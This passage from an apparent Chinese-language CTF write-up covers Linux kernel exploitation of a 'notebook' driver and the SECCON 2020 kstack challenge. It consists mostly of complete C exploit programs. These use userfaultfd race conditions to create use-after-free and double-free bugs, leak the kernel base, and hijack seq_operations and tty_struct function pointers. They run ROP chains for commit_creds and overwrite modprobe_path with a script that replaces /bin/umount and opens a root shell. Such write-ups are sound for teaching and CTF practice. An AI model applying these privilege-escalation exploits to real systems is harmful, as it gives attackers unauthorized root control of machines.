user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    char *ret_buf = malloc(0x60);\n    int i;\n    int fd[0x100];\n    uint64_t leak_addr;\n    int index;\n    g_fd = open(\"/dev/notebook\",2);\n    signal(SIGSEGV,getshell);\n// 1. notebook[0].note = heap1 / notebook[0].size = 0x20\n    char* name = malloc(0x100);\n    memset(name, 'a', 18);\n    noteadd(0,0x20,name);\n\n// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100\n    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(addr, userfaultfd_leak_handler);\n    pthread_t thr_edit,thr_add;\n    pthread_create(&thr_edit, NULL, edit_thread, 0);\n\n// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20\n    pthread_create(&thr_add, NULL, add_thread, 0);\n    // sleep(1);   //给1s缓冲时间，让size值写上\n    \n// 4. get heap1 back, then we can use the UAF\n    for(i =0 ;i<100; i++){\n        fd[i] = open(\"/proc/self/stat\",0);              // in kernel it will kmalloc(0x20)\n        read_note(ret_buf, 0);                          // check whether we hit heap1 or not\n        leak_addr = *(int64_t *)ret_buf;\n        if(((leak_addr&0xffffffff00000000) >> 32) == 0xFFFFFFFF){\n            index = i;\n            printf(\"found it! the index is %d\\n\",index);\n            break;\n        }\n    }\n\n    if(i == 100){\n        printf(\"failed to get heap1 back, let's try again!\\n\");\n        exit(0);\n    }  \n\n// 5. leak kernel base: read heap1\n    kernel_base = leak_addr - (single_start_func - bzImage_base);\n    printf(\"kernel_base : 0x%lx\\n\",kernel_base);\n\n// 6. hijack control flow: write heap1, then trigger 'seq_operations->start'\n    uint64_t control_rip = add_rsp_1a8 - bzImage_base + kernel_base;\n    write_note((char*)&control_rip,0);\n \n// 7. stack pivot: use the gift func ^_^\n    save_status();\n    noteadd(1,0x60,name);\n    noteedit(1,0x200,name);\n    notegift(ret_buf);\n    heap_addr = *(int64_t *)(ret_buf+0x10);                 // heap addr\n    int a = 0;\n    uint64_t gadget_buf[0x200] = {0};\n    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;                                     \n    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;\n    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     // mov rdi, rax\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;\n    gadget_buf[a++] = swapgs_pop_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;           \n    gadget_buf[a++] = iretq - bzImage_base + kernel_base;\n    gadget_buf[a++] = (uint64_t)getshell;\n    gadget_buf[a++] = user_cs;\n    gadget_buf[a++] = user_rflags;\n    gadget_buf[a++] = user_sp;\n    gadget_buf[a++] = user_ss;\n\n    write_note(gadget_buf,1);\n\n// 8. trigger\n    temp_fd = fd[index];\n    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;\n    __asm__(\n        \"mov r15, 0x15151515;\"     // r15\n        \"mov r14, 0x14141414;\"      // r14 /tmp/x\n        \"mov r13, 0x13131313;\"      // r13\n        \"mov r12, 0x12121212;\"      // r12\n        \"mov r11, 0x11111111;\"\n        \"mov r10, 0x10101010;\"      // r10\n        \"mov rbp, pop_rsp_ret;\"      // bbbbbbbb\n        \"mov rbx, heap_addr;\"      // aaaaaaaa\n        \"mov r9, 0x99999999;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x22222222;\"\n        \"mov rsi, 0x33333333;\"\n        \"mov rdi, temp_fd;\"\n        \"syscall\"\n    );\n\n    pthread_exit(NULL);\n    return 0;\n}\n```\n\n\n\n### exp4\n\n> 利用work_for_cpu_fn()函数，劫持tty_struct->ops->ioctl，分两次执行commit_cred(prepare_kernel_creds(0))，最后在用户态执行system(\"/bin/sh\")获得root shell\n\n注意点：\n\n1. 只能用ioctl，不能用write\n\n2. 写tty_struct和file_operations要先将内容读出，改掉目标位置后，再将内容全部写回。\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n#include <ctype.h>\n\nint g_fd = 0;\nchar* addr;\nuint64_t temp_buf[0x20];\nint temp_fd;\nuint64_t heap_addr;\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nuint64_t bzImage_base = 0xFFFFFFFF81000000;\nuint64_t kernel_base;\nuint64_t work_for_cpu_fn = 0xFFFFFFFF8109EB90;\nuint64_t ptm_ops = 0xFFFFFFFF81E8E440;\n\nuint64_t cc_addr = 0xFFFFFFFF810A9B40;\nuint64_t pkc_addr = 0xFFFFFFFF810A9EF0;\n\nstruct note{\n\tuint64_t note;\n\tuint64_t size;\n};\n\nstruct userarg{\n    uint64_t idx;\n    uint64_t size;\n    char* buf;\n};\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid noteadd(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x100, &arg);\n}\n\nvoid notedel(uint64_t idx){\n    struct userarg arg = {\n        .idx = idx,\n        .size = 0,\n        .buf = 0,\n    };\n    \n    ioctl(g_fd, 0x200, &arg);\n}\n\nvoid noteedit(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x300, &arg);    \n}\n\nvoid notegift(char* buf){\n    struct userarg arg = {\n        .idx = 0,\n        .size = 0,\n        .buf = buf,\n    };   \n\n    ioctl(g_fd, 0x64, &arg);\n}\n\nvoid write_note(char* con_buf, uint64_t idx){\n    write(g_fd,con_buf,idx);\n}\n\nvoid read_note(char* con_buf, uint64_t idx){\n    read(g_fd,con_buf,idx);\n}\n\nvoid* edit_thread(){\n    noteedit(0, 0x500, addr);\n    return NULL;\n}\n\nvoid* add_thread(){\n    noteadd(0,0x60,addr);\n    return NULL;\n}\n\nint main(){\n    char *ret_buf = malloc(0x100);\n    int i;\n    int fd[0x100];\n    uint64_t leak_addr;\n    int index;\n    g_fd = open(\"/dev/notebook\",2);\n\n// 1. notebook[0].note = heap1 / notebook[0].size = 0x3a8\n    char* name = malloc(0x100);\n    memset(name, 'a', 18);\n    noteadd(0,0x60,name);\n    noteedit(0,0x3a8,name);\n\n// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x500\n    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(addr, userfaultfd_leak_handler);\n    pthread_t thr_edit,thr_add;\n    pthread_create(&thr_edit, NULL, edit_thread, 0);\n    sleep(1);\n\n// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x60\n    pthread_create(&thr_add, NULL, add_thread, 0);\n    sleep(1);   //给1s缓冲时间，让size值写上\n    \n// 4. get heap1 back, then we can use the UAF\n    for(i =0 ;i<100; i++){\n        fd[i] = open(\"dev/ptmx\",2);              // in kernel it will kmalloc(0x3a8)\n        read_note(ret_buf, 0);                          \n        leak_addr = *(int64_t *)(ret_buf+0x18);\n        if(((leak_addr&0xffffffff00000000) >> 32) == 0xFFFFFFFF){\n            if((leak_addr&0xfff) == 0x440)              // check whether we hit heap1 or not\n            {\n                index = i;\n                printf(\"found it! the index is %d\\n\",index);\n                break;\n            } \n        }\n    }\n\n    if(i == 100){\n        printf(\"failed to get heap1 back, let's reboot and try again!\\n\");\n        exit(0);\n    }  \n\n// 5. calc kernel base\n    kernel_base = leak_addr - (ptm_ops - bzImage_base);\n    printf(\"kernel_base : 0x%lx\\n\",kernel_base);\n\n// 6. notebook[0].note = heap2 / notebook[0].size = 0x100\n    noteadd(1,0x60,name);\n    noteedit(1,0x100,name);\n\n// 7. change tty_operations->ioctl to work_for_cpu_fn\n    notegift(ret_buf);\n    uint64_t heap_addr_fn = *(int64_t *)(ret_buf+0x10);\n    char* fop_buf = malloc(0x100);\n    // 先读后写\n    read_note(fop_buf,1);\n    *(uint64_t *)(fop_buf+0x60) = work_for_cpu_fn - bzImage_base + kernel_base; \n    write_note(fop_buf,1);   \n    printf(\"tty_struct heap1 addr: 0x%lx\\n\",*(int64_t *)(ret_buf));\n    printf(\"tty_operations heap2 addr: 0x%lx\\n\",heap_addr_fn);\n\n// 8. prepare_kernel_creds(0)    \n    // 先读后写，不然可能覆盖掉重要数据\n    char* tty_buf = malloc(0x60);\n    read_note(tty_buf,0);\n    *(uint64_t *)(tty_buf+0x18) = heap_addr_fn;         // change tty_struct->ops, make it points to heap2\n    *(uint64_t *)(tty_buf+0x20) = pkc_addr - bzImage_base + kernel_base;\n    *(uint64_t *)(tty_buf+0x28) = 0x0;\n    uint64_t old_value_0x30 = *(uint64_t *)(tty_buf+0x30);\n    printf(\"old value : 0x%lx\\n\",old_value_0x30);\n    write_note(tty_buf,0);\n\n    ioctl(fd[index],0x100,32);\n\n\n// 9. commit_cred(prepare_kernel_creds(0))    \n    // 先读后写，不然可能覆盖掉重要数据\n    read_note(tty_buf,0);\n    uint64_t pkc_ret = *(uint64_t *)(tty_buf+0x30);\n    *(uint64_t *)(tty_buf+0x18) = heap_addr_fn;\n    *(uint64_t *)(tty_buf+0x20) = cc_addr - bzImage_base + kernel_base;\n    *(uint64_t *)(tty_buf+0x28) = pkc_ret;\n    *(uint64_t *)(tty_buf+0x30) = old_value_0x30;\n    write_note(tty_buf,0);\n    \n    ioctl(fd[index],0x100,32);\n\n// 10. get root shell\n    printf(\"[+] getuid() = %d\\n\",getuid());\n    if(getuid() == 0){\n        printf(\"[+] Pwned!\\n\");\n        system(\"/bin/sh\");\n    }\n\n    return 0;\n}\n```\n\n\n\n### exp5\n\n内核地址泄露：利用ko泄露（程序运行过程中，e8指令后四个字节是相对偏移量，被调用函数实际段偏移量 = 下一条指令地址 + 相对偏移量）[带你弄懂 call 指令调用方式](https://www.jianshu.com/p/55726f7e355a)\n\n任意地址读写：泄露堆地cookie，构造heap链：`freelist -> chunk1 -> notebook_addr - 0x10`。\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n#include <ctype.h>\n\nint g_fd = 0;\nchar* addr;\nuint64_t temp_buf[0x20];\nint temp_fd;\nuint64_t heap_addr;\nint uaf_index;\nuint64_t module_base = 0;\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nuint64_t bzImage_base = 0xFFFFFFFF81000000;\nuint64_t kernel_base;\nuint64_t modprobe_addr = 0xFFFFFFFF8225D2E1;\n\nstruct note{\n\tuint64_t note;\n\tuint64_t size;\n};\n\nstruct userarg{\n    uint64_t idx;\n    uint64_t size;\n    char* buf;\n};\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid noteadd(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x100, &arg);\n}\n\nvoid notedel(uint64_t idx){\n    struct userarg arg = {\n        .idx = idx,\n        .size = 0,\n        .buf = 0,\n    };\n    \n    ioctl(g_fd, 0x200, &arg);\n}\n\nvoid noteedit(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x300, &arg);    \n}\n\nvoid notegift(char* buf){\n    struct userarg arg = {\n        .idx = 0,\n        .size = 0,\n        .buf = buf,\n    };   \n\n    ioctl(g_fd, 0x64, &arg);\n}\n\nvoid write_note(char* con_buf, uint64_t idx){\n    write(g_fd,con_buf,idx);\n}\n\nvoid read_note(char* con_buf, uint64_t idx){\n    read(g_fd,con_buf,idx);\n}\n\nvoid* edit_thread(){\n    noteedit(0, 0x100, addr);\n    return NULL;\n}\n\nvoid* add_thread(){\n    noteadd(0,0x60,addr);\n    return NULL;\n}\n\nvoid get_mod_base(){\n    FILE *stream =popen(\"cat /tmp/moduleaddr  | awk '{print $6}'\",\"r\");\n    char *mem = malloc(0x20);\n    fread(mem,0x12,1,stream);\n    module_base = strtoul(mem,NULL,16);\n    printf(\"Mod_BASE:\\t %lX\\n\",module_base);\n}\n\nint main(){\n    char *ret_buf = malloc(0x100);\n    char *in_buf = malloc(0x100);\n    char *name = malloc(0x100);\n    memset(name,'a',0x100);\n\n    get_mod_base();\n\n    g_fd = open(\"/dev/notebook\",2);\n\n    noteadd(0,0x60,name);\n    noteadd(1,0x60,name);\n\n    notegift(ret_buf);\n    uint64_t heap0 = *(uint64_t *)ret_buf;\n    uint64_t heap1 = *(uint64_t *)(ret_buf+0x10);\n\n    notedel(0);\n    notedel(1);\n\n    int i = 0;\n    int found = 0;\n    uint64_t heap0_index,heap1_index;\n    for(i=0; i<0x10; i++){\n        noteadd(i,0x60,name);\n        notegift(ret_buf);\n        if(*(uint64_t *)(ret_buf+i*0x10) == heap1){\n            heap1_index = i;\n            found +=1;\n        }\n        if(*(uint64_t *)(ret_buf+i*0x10) == heap0){\n            heap0_index = i;\n            found +=1;\n        }\n        if(found == 2){\n            printf(\"[+] we find it! \\n heap0 in index %ld \\n heap1 in index %ld \\n\",heap0_index,heap1_index);\n            break;\n        }\n    }\n\n    printf(\"[-] now, i : %d\\n\",i);\n    read_note(ret_buf,heap1_index);\n    uint64_t magic = *(uint64_t *)ret_buf;\n    uint64_t cookie = magic^heap0^heap1;\n    printf(\"cookie is 0x%lx\\n\",cookie);\n\n// 重新开始\n    noteadd(0,0x60,name);\n    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(addr, userfaultfd_leak_handler);\n    pthread_t thr_edit,thr_add;\n    pthread_create(&thr_edit, NULL, edit_thread, 0);\n    sleep(1);\n    pthread_create(&thr_add, NULL, add_thread, 0);\n    sleep(1);\n\n    notegift(ret_buf);\n    uint64_t uaf_heap_addr = *(uint64_t *)(ret_buf);\n    uint64_t notebook_sub_0x10 = module_base + + 0x2500 - 0x10;\n    *(uint64_t *)in_buf = cookie^uaf_heap_addr^notebook_sub_0x10;\n    write_note(in_buf,0);\n\n    *(uint64_t *)(name+0xF0) = cookie^notebook_sub_0x10^0;\n    int fake_index = 0;\n    int j = 0;\n    for( j=1; j < 0x10 ; j++){\n        noteadd(j,0x60,name);\n        notegift(ret_buf);\n        if(*(uint64_t *)(ret_buf+j*0x10) == uaf_heap_addr){\n            printf(\"[+] got it!\\n\");\n            break;\n        }\n    }\n\n    if(j == 0x10){\n        printf(\"[+] reboot, and try again\\n\");\n        exit(0);\n    }\n\n    // printf(\"give you 20s to attach debugger!!!\\n\");\n    // sleep(20);\n\n    printf(\"kmalloc uaf object back\\n\");\n    fake_index = j+1;\n    noteadd(fake_index,0x60,name);\n\n\n// leak kernel base\n    *(uint64_t *)(in_buf+0x20) = module_base + 0x168;          // call copy_from_user\n    *(uint64_t *)(in_buf+0x28) = 0x4;   \n    write_note(in_buf,fake_index);\n    read_note(ret_buf,1);\n    kernel_base = ((*(uint32_t *)ret_buf + module_base + 0x16c) | 0xffffffff00000000) - 0x476c30;\n    // 被调用函数实际段偏移量 = 下一条指令地址 + 相对偏移量\n    printf(\"kernel base : 0x%lx\\n\",kernel_base);\n\n// change modprobe_path \n    printf(\"[+] change notebook[0] to point to modprobe_path!\\n\");\n    *(uint64_t *)(in_buf+0x10) = modprobe_addr - bzImage_base + kernel_base;\n    *(uint64_t *)(in_buf+0x18) = 0x8;\n    write_note(in_buf,fake_index);\n    printf(\"[+] write notebook[0] to change modprobe_path!\\n\");\n    memcpy(in_buf,\"/tmp/x\\x00\",8);\n    write_note(in_buf,0);\n\n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\nexec 0</dev/console\\\\nexec 1>/dev/console\\\\nexec 2>/dev/console\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n                         \n    system(\"/tmp/dummy 2>/dev/null\");\n    system(\"ls -l /flag\");\n    system(\"cat /flag\");\n\n    exit(0);\n}\n```\n\n\n\n## 问题\n\n- 问题1：/init的输出无法显示是什么原因？\n\n  为什么这个题，使用modprobe_path方法改了umount，但exit后不能获得root shell？？？因为init脚本中，没有下面这三行：\n\n  ```bash\n  exec 0</dev/console\n  exec 1>/dev/console\n  exec 2>/dev/console\n  ```\n\n  导致exit退出后，`/dev/console`的内容无法显示给我们。如下图，是在init脚本中增加以上三行代码的结果。\n\n  ![image-20230225194548400](image-20230225194548400.png?size=600)\n\n  [Difference between /dev/console, /dev/tty, and /dev/tty0](https://www.baeldung.com/linux/monitor-keyboard-drivers)\n\n  找到根本原因后，一切就变得简单了。在我们改的umount文件中，`/bin/sh`之前增加这三行代码，就能达到获得root shell的目的啦！\n\n  ```bash\n  system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\nexec 0</dev/console\\\\nexec 1>/dev/console\\\\nexec 2>/dev/console\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n  ```\n\n  \n\n- 问题2：在内核态执行`commit_creds(prepare_kernel_cred(0))`时，gadget不好找，怎么办？\n\n  对于支持多核的内核中，有一个 [work_for_cpu_fn()](https://elixir.bootlin.com/linux/v5.15/source/kernel/workqueue.c#L5170) 函数，其反汇编后的代码如下\n\n  ```c\n  __int64 __fastcall work_for_cpu_fn(__int64 a1)\n  {\n    __int64 result; // rax\n  \n    _fentry__();\n    result = (*(__int64 (__fastcall **)(_QWORD))(a1 + 32))(*(_QWORD *)(a1 + 40));\n    *(_QWORD *)(a1 + 48) = result;\n    return result;\n  }\n  ```\n\n  只要控制参数a1（RDI）指向内存的内容，即可执行一个参数的任意函数（如`prepare_kernel_cred(0)`），并将返回值写入内存中。\n\n  \n\n\n\n# 题目2 - SECCON2020 kstack\n\n[userfaultfd利用方法视频讲解](https://www.youtube.com/watch?v=6dFmH_JEF4s)\n\n[Kstack - Seccon 2020](https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/kstack)\n\n[从 SECCON2020 一道 kernel pwn 看 userfaultfd + setxattr “堆占位”技术](https://www.anquanke.com/post/id/266898)\n\n[seccon-2020-kstack](https://roderickchan.github.io/2022/04/28/seccon-2020-kstack/)\n\n\n\n系统开启KASLR，SMEP，KPTI\n\n```bash\n➜  kstack cat start.sh \n#!/bin/sh\nqemu-system-x86_64 \\\n    -m 512M \\\n    -kernel ./bzImage \\\n    -initrd ./rootfs.cpio \\\n    -append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet\" \\\n    -cpu kvm64,+smep \\\n    -net user -net nic -device e1000 \\\n    -monitor /dev/null \\\n    -nographic\n\n$ cat /sys/devices/system/cpu/vulnerabilities/*\nProcessor vulnerable\nMitigation: PTE Inversion\nVulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown\nMitigation: PTI\nVulnerable\nMitigation: usercopy/swapgs barriers and __user pointer sanitization\nMitigation: Full generic retpoline, STIBP: disabled, RSB filling\nNot affected\n```\n\n\n\n## 分析\n\n题目附件：[kstack.tar.gz](kstack.80da39cf379e98884be9c02889575868.tar.gz)\n\n全局变量head未加锁，在0x57ac001和0x57ac002两个分支中都有使用到它，所以存在条件竞争的可能。\n\n![image-20230301002128590](image-20230301002128590.png?size=600)\n\n## 利用\n\n方法1 - **exp1**：\n\n- **条件竞争泄露信息**：如果利用userfaultfd让一个线程卡在copy_from_user，另一个线程执行copy_to_user分支，就能泄露堆上的信息\n- **条件竞争产生UAF**：copy_to_user线程执行完后，会free掉第一个线程申请的堆，于是产生了悬空指针。\n- **结构体占用UAF堆块，完成控制流劫持**：如果使用某个结构体占用刚刚释放的堆块，并在此时恢复copy_from_user线程的执行，让*arg覆盖结构体中的函数指针，就可以劫持控制流了。\n\n方法2- **exp2**：\n\n- **条件竞争泄露信息**：同上\n\n- **条件竞争构造double free**：copy_from_user线程卡住，起第二个线程执行到copy_to_user处卡住，此时第三个线程也进入copy_to_user释放堆块，然后放行第二个线程，会再次释放堆块，于是产生double free\n- **\"setxattrr+usefaultfd\" 改堆块指针，达到任意地址写**：同libc\n\n方法3 - **exp3**：\n\n- **条件竞争泄露信息**：同上\n- **条件竞争构造double free**：同上\n- **结构体占用double free堆块，\"setxattrr+usefaultfd\" 改结构体函数指针，完成控制流劫持**：某种程度上，可以看作方法1和方法2的结合。double free后，先malloc并用seq_operations占用UAF堆块，再malloc一次（还是那个UAF堆块）并使用\"setxaddr+userfaultfd\"改函数指针，最后通过操作seq_operations->start控制流劫持\n\n\n\n### exp1\n\n具体做法如下：\n\n- 信息泄露：`CMD_PUSH`分支中，申请的堆块为kmalloc-0x20大小。于是选择先通过` open(\"/proc/self/stat\",0);`（申请0x20堆块）和`close()`（释放0x20堆块）在堆中喷上函数指针，再利用本题的漏洞，就能从copy_to_user()泄露内核函数地址（`single_stop()`）给用户态。\n- 控制流劫持：利用seq_operations结构体占用该堆块，并控制copy_from_user的arg地址处的值，那么就能控制`seq_operations->stop`函数指针。\n- 提权：利用pt_regs执行ROP gadget写modprobe_path，完成提权。\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n#include <ctype.h>\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n#define BZIMAGE_ADDR 0xFFFFFFFF81000000\n\nint fd_kstack = 0;\nuint64_t kernel_base = 0;\nchar* fault_addr;\nuint64_t fd_seq[0x50] = {0};\nuint64_t temp_fd = 0;\n\nuint64_t single_stop_off = 0xFFFFFFFF8113BE80 - BZIMAGE_ADDR;\n\nuint64_t modprobe_path_addr = 0xFFFFFFFF81C2C541 - BZIMAGE_ADDR;\nuint64_t add_rsp_0x1f8_ret = 0xffffffff814d51c0 - BZIMAGE_ADDR;\nuint64_t pop_rdx_rdi_ret = 0xffffffff8122dd4b - BZIMAGE_ADDR;\nuint64_t pop_rsi_ret = 0xffffffff81047a8e - BZIMAGE_ADDR;\nuint64_t mov_qp_rdx_rdi_ret = 0xffffffff8121216f - BZIMAGE_ADDR;\nuint64_t do_task_dead = 0xFFFFFFFF8106EBB0 - BZIMAGE_ADDR;\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(3);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    *(uint64_t*)page = add_rsp_0x1f8_ret;          // control rip\n\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, 